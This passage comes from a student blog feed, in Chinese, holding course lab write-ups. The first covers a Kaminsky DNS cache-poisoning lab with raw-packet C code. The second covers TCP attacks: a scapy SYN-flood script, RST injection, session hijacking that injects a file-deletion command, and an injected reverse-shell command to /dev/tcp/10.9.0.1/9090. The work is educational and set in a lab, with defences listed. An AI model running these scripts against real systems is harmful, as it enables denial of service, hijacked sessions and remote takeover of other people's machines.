class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// Students need to implement this function</span></span><br><span class="line">  send_raw_packet(req,size);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Use for sending forged DNS response.</span></span><br><span class="line"><span class="comment"> * Add arguments to the function definition if needed.</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">send_dns_response</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *resp,<span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// Students need to implement this function</span></span><br><span class="line">  send_raw_packet(resp,size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Send the raw packet out </span></span><br><span class="line"><span class="comment"> *    buffer: to contain the entire IP packet, with everything filled out.</span></span><br><span class="line"><span class="comment"> *    pkt_size: the size of the buffer.</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">send_raw_packet</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> * buffer, <span class="type">int</span> pkt_size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">dest_info</span>;</span></span><br><span class="line">  <span class="type">int</span> enable = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Step 1: Create a raw network socket.</span></span><br><span class="line">  <span class="type">int</span> sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Step 2: Set socket option.</span></span><br><span class="line">  setsockopt(sock, IPPROTO_IP, IP_HDRINCL,</span><br><span class="line">     &amp;enable, <span class="keyword">sizeof</span>(enable));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Step 3: Provide needed information about destination.</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ipheader</span> *<span class="title">ip</span> =</span> (<span class="keyword">struct</span> ipheader *) buffer;</span><br><span class="line">  dest_info.sin_family = AF_INET;</span><br><span class="line">  dest_info.sin_addr = ip-&gt;iph_destip;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Step 4: Send the packet out.</span></span><br><span class="line">  sendto(sock, buffer, pkt_size, <span class="number">0</span>,</span><br><span class="line">       (<span class="keyword">struct</span> sockaddr *)&amp;dest_info, <span class="keyword">sizeof</span>(dest_info));</span><br><span class="line">  close(sock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2022/05/30/software-security-lab6/image-20220530214258861.png" alt="image-20220530214258861"></p><h1 id="task6-verify"><a href="#task6-verify" class="headerlink" title="task6: verify"></a>task6: verify</h1><p>这里要做的是验证一下我们确实攻击成功了</p><p><img src="/2022/05/30/software-security-lab6/image-20220530214529111.png" alt="image-20220530214529111"></p><p>下面是直接dig attacker的服务器查询example.com的结果</p><p><img src="/2022/05/30/software-security-lab6/image-20220530214632385.png" alt="image-20220530214632385"></p><p>接下来尝试使用wireshark抓包来进一步确认。以下是在本地DNS中没有缓存时，访问<a href="http://www.example.com的结果.可以看到最终是153结尾的attacker返回的结果.说明我们成功劫持了ip末尾为53的dns服务器的example.com的权威dns服务器缓存./">www.example.com的结果。可以看到最终是153结尾的attacker返回的结果。说明我们成功劫持了IP末尾为53的DNS服务器的example.com的权威DNS服务器缓存。</a></p><p><img src="/2022/05/30/software-security-lab6/image-20220530222551632.png" alt="image-20220530222551632"></p><p>下图是直接尝试访问attacker的DNS服务器。可以看到时一模一样的(除了第一个包里面可以看到是直接请求的attacker32的DNS，而上面那张图是example.com)也就是说，attacker现在可以完全控制example.com的DNS解析权。</p><p><img src="/2022/05/30/software-security-lab6/image-20220530215753550.png" alt="image-20220530215753550"></p><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><ol><li>增大transcationID取值范围，使之更难爆破</li><li>随机化DNS端口号(其实相当于增大transcationID取值范围)</li><li>对于每一个DNS请求，询问两次。这样敌手需要爆破32位。</li><li>使用DNSSEC机制。(类似于公钥身份验证)</li></ol><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>从上述实验中，完成了一次Kaminsky攻击。了解了DNS解析的缺陷以及Kaminsky攻击的优越特性：使得攻击只是时间问题。并且使用C语言编写的程序，大大加快爆破transID的速度，最终成功实践仅需要不到一分钟。</p><p>最后，了解了一下如何防御DNS的攻击，主要还是让爆破变得更加困难，增加随机数取值的思路。最终结束了对于本学期软件安全的所有实验，受益良多。</p>]]></content>
      
      
      <categories>
          
          <category> school </category>
          
      </categories>
      
      
        <tags>
            
            <tag> software-security </tag>
            
            <tag> DNS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>software-security-lab5</title>
      <link href="/2022/05/18/software-security-lab5/"/>
      <url>/2022/05/18/software-security-lab5/</url>
      
        <content type="html"><![CDATA[<p>《软件安全》课程实验5，tcp相关实验，主要是协议缺陷导致的劫持session，dos攻击</p><span id="more"></span><h1 id="TCP-lab"><a href="#TCP-lab" class="headerlink" title="TCP lab"></a>TCP lab</h1><h2 id="task1"><a href="#task1" class="headerlink" title="task1"></a>task1</h2><p>首先看一下系统的队列长度。一般而言，系统的内存越大，队列越大。这里的队列是指TCP连接的等待队列。</p><p><img src="/2022/05/18/software-security-lab5/image-20220510191543262.png" alt="image-20220510191543262"></p><p>除此以外，可以用以上<code>netstat</code>命令查看队列的用处。</p><h3 id="syn-cookie"><a href="#syn-cookie" class="headerlink" title="syn cookie"></a>syn cookie</h3><p>一般而言,syn cookie的保护在ubuntu中是默认开启的。SYN_COOKIE使得服务器在收到每个连接时，检查一下是否和之前的连接信息匹配。具体而言，如下所示。</p><p><img src="/2022/05/18/software-security-lab5/image-20220524133430797.png" alt="image-20220524133430797"></p><blockquote><p>SYN cookie</p><p>使用一个公式生成SNs。从而在第三步检验是否是伪造的SNS</p><p>T: 时间窗口，例如：每64秒加一，因此服务器的T和下一次发来的最多就差1。</p><p>mss: MTU-tcp头-ip头。为了防止被拆分?</p><p>L: 一个签名(mac值)</p><p>由于端口、IP地址等，都是不会被存放的，直接把包中的提取出来即可。因此不需要资源保存。最关键的就是Mac的key。保证了验证安全性</p></blockquote><h3 id="launch-attack"><a href="#launch-attack" class="headerlink" title="launch attack"></a>launch attack</h3><p>在docker里面运行这个python脚本。这里的IP写的是受害者IP，端口号写的是23，也就是telnet端口号。</p><p><img src="/2022/05/18/software-security-lab5/image-20220510193001078.png" alt="image-20220510193001078"></p><p>但是后来发现，我们还是可以成功连接。</p><p><img src="/2022/05/18/software-security-lab5/image-20220510193313724.png" alt="image-20220510193313724"></p><p>在docker里面查看连接队列状况，如下所示。可以看到出现了很多<code>SYN_RECV</code>等待的状态，这说明有很多连接确实是属于半开放状态，证实了我们的tcp连接攻击起到了一定的效果，但并没有成功的拒绝服务。</p><p><img src="/2022/05/18/software-security-lab5/image-20220510193241984.png" alt="image-20220510193241984"></p><p>在pdf中，作者给出了一些可能的原因。</p><ol><li><p>tcp cache: <strong>tcp会为已经连接过这个主机的一些IP做一个cache。容量大概在整个queue的1/4左右</strong>。因此在我们已经连结果victim的情况下，可能victim的docker记住过我们的IP，为我们下一次telnet登录预留了空间。(我之前确实登陆过)</p></li><li><p>tcp 重传机制。在等待ACK包的时候，如果超过了一定时间，TCP就会重传SYN+ACK的包。可以利用<code>sysctl net.ipv4.tcp_synack_retries</code>查看需要重传几次包。例如我电脑上的victim中，数值为5.</p><p><img src="/2022/05/18/software-security-lab5/image-20220510194156685.png" alt="image-20220510194156685"></p></li></ol><p>​        这说明当我们重传SYN+ACK的包五次之后，如果还没有收到回应，系统就会删除这个连接。再加上python脚本速度不够。在本次尝试中，我是用的是单线程python脚本进行tcp flooding。因此可以尝试多线程或者多开几个实例。下面是改进的攻击。</p><h3 id="改进攻击"><a href="#改进攻击" class="headerlink" title="改进攻击"></a>改进攻击</h3><p>首先，刷新victm为我们保留的登陆记录。</p><p><img src="/2022/05/18/software-security-lab5/image-20220510195209338.png" alt="image-20220510195209338"></p><p>接着，调整我们的脚本为多线程。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> IP,TCP,send</span><br><span class="line"><span class="keyword">from</span> ipaddress <span class="keyword">import</span> IPv4Address</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">ip = IP(dst=<span class="string">&quot;10.9.0.5&quot;</span>)</span><br><span class="line">tcp = TCP(dport=<span class="number">23</span>,flags=<span class="string">&#x27;S&#x27;</span>) <span class="comment"># the port of telnet</span></span><br><span class="line">pkt=ip/tcp</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        pkt[IP].src = <span class="built_in">str</span>(IPv4Address(getrandbits(<span class="number">32</span>)))</span><br><span class="line">        pkt[TCP].sport = getrandbits(<span class="number">16</span>)</span><br><span class="line">        pkt[TCP].seq = getrandbits(<span class="number">32</span>)</span><br><span class="line">        send(pkt,verbose = <span class="number">0</span>)</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">        t = threading.Thread(target = attack)</span><br><span class="line">        t.start()</span><br></pre></td></tr></table></figure><p>最后，修改我们queue的大小，使之小于我们使用命令能够看到的最大连接量。在这里，我调整为80。这里不知道为什么，别的同学不用修改队列大小就能成功，但是我不修改队列大小始终无法成功。从下面可以看出等待连接的队列一直停留在128的位置，和最大容量256相差很大。即使使用多线程也没有解决这个问题。因此最后必须要修改队列长度。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net.ipv4.tcp_max_syn_backlog=80</span><br></pre></td></tr></table></figure><p>之后便可以发现攻击成功，我们无法用telnet连接上服务器，一直在显示trying，最终timeout了。</p><p><img src="/2022/05/18/software-security-lab5/image-20220510205127980.png" alt="image-20220510205127980"></p><p>回到我们victim的docker里面，发现连接队列几乎被占满。</p><p><img src="/2022/05/18/software-security-lab5/image-20220510200517448.png" alt="image-20220510200517448"></p><p>查看一下连接队列的属性，发现全都被随机的IP和端口号填充满了。</p><p><img src="/2022/05/18/software-security-lab5/image-20220510200612615.png" alt="image-20220510200612615"></p><p>所以当我们刷新了连接buffer，修改python为多线程，调整系统的tcp连接队列大小之后，我们确实无法链接到此IP。</p><p>经过测试，当能够接受的连接最大数量为128时，需要python 11个以上的线程同时运行才能完成一次攻击。因此，在下面的例子中我们使用c语言编写的程序，速度会大大加快。</p><h2 id="task-1-2"><a href="#task-1-2" class="headerlink" title="task 1.2"></a>task 1.2</h2><p>第二个task，我们用C实现的tcp flooding脚本尝试完成此攻击。我们首先把queue恢复到原来的大小</p><p><img src="/2022/05/18/software-security-lab5/image-20220510200852973.png" alt="image-20220510200852973"></p><p>接着使用以下命令编译并执行此文件。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -o synflood synflood.c</span><br><span class="line">./synflood 10.9.0.5 23</span><br></pre></td></tr></table></figure><p>未开多线程时，python脚本执行效果如下所示。可以看到队列中时常会出现小于128的滞留序列。</p><p><img src="/2022/05/18/software-security-lab5/image-20220510201734224.png" alt="image-20220510201734224"></p><p>使用C生成的可执行文件结果如下所示。可以看到，几乎没有出现过小于128的数值。</p><p><img src="/2022/05/18/software-security-lab5/image-20220510202222470.png" alt="image-20220510202222470"></p><p>这是因为c作为一种编译性语言，和解释型语言(python)相比，速度会有明显的上升。</p><h2 id="Enable-cookie"><a href="#Enable-cookie" class="headerlink" title="Enable cookie"></a>Enable cookie</h2><p>这里我们重新把队列大小调整回去，并且设置syncookies为1。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net.ipv4.tcp_syncookies=1</span><br></pre></td></tr></table></figure><p><img src="/2022/05/18/software-security-lab5/image-20220510202455670.png" alt="image-20220510202455670"></p><p>接着将队列长度同样的设置小</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net.ipv4.tcp_max_syn_backlog=80</span><br></pre></td></tr></table></figure><p>发现我们攻击基本上都失败了</p><p><img src="/2022/05/18/software-security-lab5/image-20220510203209647.png" alt="image-20220510203209647"></p><blockquote><p>成功原因: tcp cookie采用的方案是<strong>当连接超过一定数目时，不保存tcp连接的中间结果</strong>，也就是说不为syn开辟内存。并且是用一种hash技术，发送SYN ACK中将包含远IP和端口的mac。这样也能够防止攻击者伪造ACK包。</p></blockquote><h2 id="task2-TCP-RST-Attacks"><a href="#task2-TCP-RST-Attacks" class="headerlink" title="task2 TCP RST Attacks"></a>task2 TCP RST Attacks</h2><h3 id="使用wireshark抓包"><a href="#使用wireshark抓包" class="headerlink" title="使用wireshark抓包"></a>使用wireshark抓包</h3><p>使用如下命令截获两台主机之间发送的数据包。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tcpdump -i br-16cafce4b285 -w ./pkt2.pcap -v &#x27;tmp and src 10.9.0.6 and dst host 10.9.0.7&#x27;</span><br></pre></td></tr></table></figure><p>可以抓取数据包并保存在本地。接着使用wireshark打开</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wireshark ./pkt2.pcap</span><br></pre></td></tr></table></figure><p>可以看到下面的内容。我们观察到下图，发现telnet实际上next seq始终是本次seq+1.因此</p><p><img src="/2022/05/18/software-security-lab5/image-20220511092929276.png" alt="image-20220511092929276"></p><p>首先我们需要把网卡的混杂模式打开</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ip link set br-9b3a554cecec promisc on</span><br></pre></td></tr></table></figure><p>注意这里网卡的名称，需要用ifconfig看到。如下图。看到第一个网卡所在的就是两个user的子网，因此我们就把这个网卡设置为混杂模式。</p><p><img src="/2022/05/18/software-security-lab5/image-20220510223755263.png" alt="image-20220510223755263"></p><p>使用以下命令可以完成包劫持的工作</p><p><img src="/2022/05/18/software-security-lab5/image-20220510223649384.png" alt="image-20220510223649384"></p><p>接下来就可以编写简单的脚本，并过滤出攻击的目标端口、源端口、目标IP，源IP即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exec_attack</span>(<span class="params">src_ip,dst_ip,src_port,dst_port,next_seq</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    execute attack</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># time.sleep(2)</span></span><br><span class="line">    ip = IP(src=<span class="built_in">str</span>(src_ip),dst=<span class="built_in">str</span>(dst_ip))</span><br><span class="line">    tcp = TCP(sport = <span class="built_in">int</span>(src_port), dport = <span class="built_in">int</span>(dst_port),flags=<span class="string">&quot;R&quot;</span>,seq = next_seq) <span class="comment"># reset packge</span></span><br><span class="line">    pkt = ip/tcp</span><br><span class="line">    ls(pkt)</span><br><span class="line">    send(pkt,verbose=<span class="number">0</span>,iface=<span class="string">&quot;br-16cafce4b285&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_package</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;received arguments: &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;src ip: &quot;</span> + <span class="built_in">str</span>(x[IP].src))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;dst ip: &quot;</span> + <span class="built_in">str</span>(x[IP].dst))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;src port: &quot;</span> + <span class="built_in">str</span>(x[IP].sport))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;dst port: &quot;</span> + <span class="built_in">str</span>(x[IP].dport))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;tcp seq: &quot;</span> + <span class="built_in">str</span>(x[TCP].seq))</span><br><span class="line">    <span class="comment"># proceed these values and send it to exec_attack</span></span><br><span class="line">    exec_attack(x[IP].src,x[IP].dst,x[IP].sport,x[IP].dport,x[TCP].seq+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_sniff</span>():</span><br><span class="line">    sniff(<span class="built_in">filter</span>=<span class="string">&quot;dst 10.9.0.6 and tcp&quot;</span>,iface=<span class="string">&quot;br-16cafce4b285&quot;</span>,prn=<span class="keyword">lambda</span> x:print_package(x))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    my_sniff()</span><br></pre></td></tr></table></figure><p>从下面的截图中可以看到，当用户尝试输入用户名时，连接就被中断。(注意，我这里并没有输入ctrl+c, 如果输入会在用户名界面上直接显示出来)原理是当我们输入用户名时，本质上还是往服务器发送了一个报文，这个报文在经过scapy的时候被截获，scapy进而立刻发送一个带有RST字段的包给目的主机，从而使目的主机认为连接需要关闭，因此结束了本次连接。</p><p><img src="/2022/05/18/software-security-lab5/image-20220511093716786.png" alt="image-20220511093716786"></p><h2 id="task3-TCP-Session-Hijacking"><a href="#task3-TCP-Session-Hijacking" class="headerlink" title="task3 TCP Session Hijacking"></a>task3 TCP Session Hijacking</h2><p>上面一个例子中，我们通过受害者发送包的同时发送一个RST包，从而使连接中断，下面的实验中我们还能做到任意代码执行。</p><p>这里由于我们还需要一个tcp的ack号码，因此也需要截获包中的tcp编号。使用脚本可以很方便的达到这一点。</p><p>和上一个脚本的不同之处在于，这次我们在data部分写上了我们要执行的命令，然后在伪造的tcp部分写上了ack编号，这个ack编号我这里是直接用的截获的发出去的包的ack，可能是scapy接获之后发送的包将会先到达目标服务器的缘故，这样做是可以成功的。</p><p>我使用的命令如下所示</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\rrm -f /home/seed/secret.txt\r</span><br></pre></td></tr></table></figure><p>开头和结尾的两个<code>\r</code>分别用来清除之前可能发送到目标主机的垃圾数据，以及我们输入命令结束时的回车符。在这里我尝试通过删除目标主机的一个用户权限下的文件来证明达成了攻击效果。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exec_attack</span>(<span class="params">src_ip,dst_ip,src_port,dst_port,next_seq,ack_num</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    execute attack</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># time.sleep(2)</span></span><br><span class="line">    ip = IP(src=<span class="built_in">str</span>(src_ip),dst=<span class="built_in">str</span>(dst_ip))</span><br><span class="line">    tcp = TCP(sport = <span class="built_in">int</span>(src_port), dport = <span class="built_in">int</span>(dst_port),flags=<span class="string">&quot;A&quot;</span>,seq = next_seq,ack = ack_num) <span class="comment"># reset packge</span></span><br><span class="line">    data = <span class="string">&quot;\rrm -f /home/seed/secret.txt\r&quot;</span></span><br><span class="line">    pkt = ip/tcp/data</span><br><span class="line">    ls(pkt)</span><br><span class="line">    send(pkt,verbose=<span class="number">0</span>,iface=<span class="string">&quot;br-16cafce4b285&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_package</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;received arguments: &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;src ip: &quot;</span> + <span class="built_in">str</span>(x[IP].src))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;dst ip: &quot;</span> + <span class="built_in">str</span>(x[IP].dst))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;src port: &quot;</span> + <span class="built_in">str</span>(x[IP].sport))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;dst port: &quot;</span> + <span class="built_in">str</span>(x[IP].dport))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;tcp seq: &quot;</span> + <span class="built_in">str</span>(x[TCP].seq))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;tcp ack: &quot;</span> + <span class="built_in">str</span>(x[TCP].ack))</span><br><span class="line">    <span class="comment"># proceed these values and send it to exec_attack</span></span><br><span class="line">    exec_attack(x[IP].src,x[IP].dst,x[IP].sport,x[IP].dport,x[TCP].seq+<span class="number">1</span>,x[TCP].ack)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_sniff</span>():</span><br><span class="line">    sniff(<span class="built_in">filter</span>=<span class="string">&quot;dst 10.9.0.6 and tcp&quot;</span>,iface=<span class="string">&quot;br-16cafce4b285&quot;</span>,prn=<span class="keyword">lambda</span> x:print_package(x))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    my_sniff()</span><br></pre></td></tr></table></figure><p>成功截图如下所示。从左上角的终端可以看到，可以看到服务器的一个秘密文件已经被删除。右半边的终端中，显示了我们构造包的命令，是<code>rm -f /home/seed/secret.txt</code>。</p><p><img src="/2022/05/18/software-security-lab5/image-20220511132408750.png" alt="image-20220511132408750"></p><blockquote><p>注意，这里发现一旦攻击者发送删除文件命令之后，<strong>用户就无法再向服务器终端输入内容</strong>了，这是因为由于我们攻击时，<strong>发送了一个随机的序列号，服务器收到时，就会认为原先没有收到的这部分序列号出现了丢包，因此会要求用户重发</strong>。但是<strong>用户显然没有发送过这个数据包，因此会认为这个包无效</strong>，<strong>但是服务器还会一直重发</strong>，这就导致了用户终端卡死了。</p></blockquote><h2 id="task4-Creating-Reverse-Shell"><a href="#task4-Creating-Reverse-Shell" class="headerlink" title="task4 Creating Reverse Shell"></a>task4 Creating Reverse Shell</h2><p>由于在3中，我们相当于能够执行任意命令一次，那么我们也可以执行一个让服务器生成反向shell的命令，那么我们就可以执行多次命令了。</p><p>我们只需要把命令改成以下内容即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exec_attack</span>(<span class="params">src_ip,dst_ip,src_port,dst_port,next_seq,ack_num</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    execute attack</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># time.sleep(2)</span></span><br><span class="line">    ip = IP(src=<span class="built_in">str</span>(src_ip),dst=<span class="built_in">str</span>(dst_ip))</span><br><span class="line">    tcp = TCP(sport = <span class="built_in">int</span>(src_port), dport = <span class="built_in">int</span>(dst_port),flags=<span class="string">&quot;A&quot;</span>,seq = next_seq,ack = ack_num) <span class="comment"># reset packge</span></span><br><span class="line">    data = <span class="string">&quot;\r /bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1 \r&quot;</span></span><br><span class="line">    pkt = ip/tcp/data</span><br><span class="line">    ls(pkt)</span><br><span class="line">    send(pkt,verbose=<span class="number">0</span>,iface=<span class="string">&quot;br-16cafce4b285&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_package</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;received arguments: &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;src ip: &quot;</span> + <span class="built_in">str</span>(x[IP].src))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;dst ip: &quot;</span> + <span class="built_in">str</span>(x[IP].dst))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;src port: &quot;</span> + <span class="built_in">str</span>(x[IP].sport))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;dst port: &quot;</span> + <span class="built_in">str</span>(x[IP].dport))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;tcp seq: &quot;</span> + <span class="built_in">str</span>(x[TCP].seq))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;tcp ack: &quot;</span> + <span class="built_in">str</span>(x[TCP].ack))</span><br><span class="line">    <span class="comment"># proceed these values and send it to exec_attack</span></span><br><span class="line">    exec_attack(x[IP].src,x[IP].dst,x[IP].sport,x[IP].dport,x[TCP].seq+<span class="number">1</span>,x[TCP].ack)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_sniff</span>():</span><br><span class="line">    sniff(<span class="built_in">filter</span>=<span class="string">&quot;dst 10.9.0.6 and tcp&quot;</span>,iface=<span class="string">&quot;br-16cafce4b285&quot;</span>,count=<span class="number">1</span>,prn=<span class="keyword">lambda</span> x:print_package(x))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    my_sniff()</span><br></pre></td></tr></table></figure><p>其实最重要的修改就是data部分的命令，换成了打开远程反向shell的命令。其他的和劫持会话内容没有区别。</p><p><img src="/2022/05/18/software-security-lab5/image-20220512162650847.png" alt="image-20220512162650847"></p><p>在受害主机10.9.0.6中执行命令查看当前存在的连接，发现确实存在着到10.9.0.1的TCP连接，说明我们成功建立了反向shell。关于反向shell命令的含义，大致而言是把输入流和输出流都重定向到远程的主机上的某个端口，并且执行一个/bin/bash来方便交互。</p><p><img src="/2022/05/18/software-security-lab5/image-20220511135528505.png" alt="image-20220511135528505"></p><p>至此，完成了这次实验。</p><h1 id="抵抗方法"><a href="#抵抗方法" class="headerlink" title="抵抗方法"></a>抵抗方法</h1><p>对于synflood: 使用tcp 